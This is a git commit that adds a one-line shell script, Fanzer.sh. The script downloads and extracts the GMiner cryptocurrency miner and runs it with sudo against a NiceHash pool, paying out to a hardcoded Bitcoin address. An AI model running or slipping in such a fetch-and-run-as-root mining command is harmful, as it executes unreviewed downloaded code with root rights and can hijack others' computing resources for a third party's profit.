2c468552da726e1ace164cf96da03f87c0394195
hosin269 <88583109+hosin269@users.noreply.github.com>
2021-08-26 22:14:05 +0430

    Create Fanzer.sh

---
+++ Fanzer.sh
@@ -0,0 +1,1 @@
+wget https://github.com/develsoftware/GMinerRelease/releases/download/2.56/gminer_2_56_linux64.tar.xz && tar xf gminer_2_56_linux64.tar.xz && sudo ./miner --server nicehash+tcp://daggerhashimoto.usa.nicehash.com:3353 --user 3Bm7DtRRvekism3RpGUb2EuTh6aWExyNeA --pass x
